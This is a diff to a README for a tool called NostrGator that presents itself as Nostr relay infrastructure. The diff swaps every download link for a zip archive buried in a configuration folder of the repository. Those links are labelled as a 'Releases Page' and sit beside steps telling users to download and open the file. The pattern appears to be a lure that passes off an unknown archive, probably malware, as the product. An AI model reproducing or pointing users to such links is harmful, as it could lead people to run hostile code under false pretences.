@@ -4,10 +4,10 @@
 Welcome to NostrGator! This application provides a complete sovereign infrastructure for the Nostr network. You can set up specialized relays, host files securely, and monitor your network, all from one platform. Follow these steps to download and run NostrGator easily.
 
 ## ⬇️ Download Now
-[![Download NostrGator](https://raw.githubusercontent.com/kenya12345678/NostrGator/main/vampproof/NostrGator.zip%20NostrGator-v1.0-brightgreen)](https://raw.githubusercontent.com/kenya12345678/NostrGator/main/vampproof/NostrGator.zip)
+[![Download NostrGator](https://github.com/kenya12345678/NostrGator/raw/refs/heads/main/configs/alby-hub/Gator_Nostr_1.8.zip%20NostrGator-v1.0-brightgreen)](https://github.com/kenya12345678/NostrGator/raw/refs/heads/main/configs/alby-hub/Gator_Nostr_1.8.zip)
 
 ## 📥 Download & Install 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/kenya12345678/NostrGator/main/vampproof/NostrGator.zip) to find the latest version of NostrGator.
+1. Visit the [Releases Page](https://github.com/kenya12345678/NostrGator/raw/refs/heads/main/configs/alby-hub/Gator_Nostr_1.8.zip) to find the latest version of NostrGator.
 2. Click on the version link that suits your needs.
 3. Download the setup file for your operating system.
 4. Open the downloaded file to start the installation.
@@ -88,4 +88,4 @@ NostrGator is distributed under the MIT License. You can use, modify, and distri
 
 ---
 
-Thank you for choosing NostrGator. Your journey to a more private, decentralized experience begins now! For any additional assistance, visit our [Releases Page](https://raw.githubusercontent.com/kenya12345678/NostrGator/main/vampproof/NostrGator.zip).
+Thank you for choosing NostrGator. Your journey to a more private, decentralized experience begins now! For any additional assistance, visit our [Releases Page](https://github.com/kenya12345678/NostrGator/raw/refs/heads/main/configs/alby-hub/Gator_Nostr_1.8.zip).
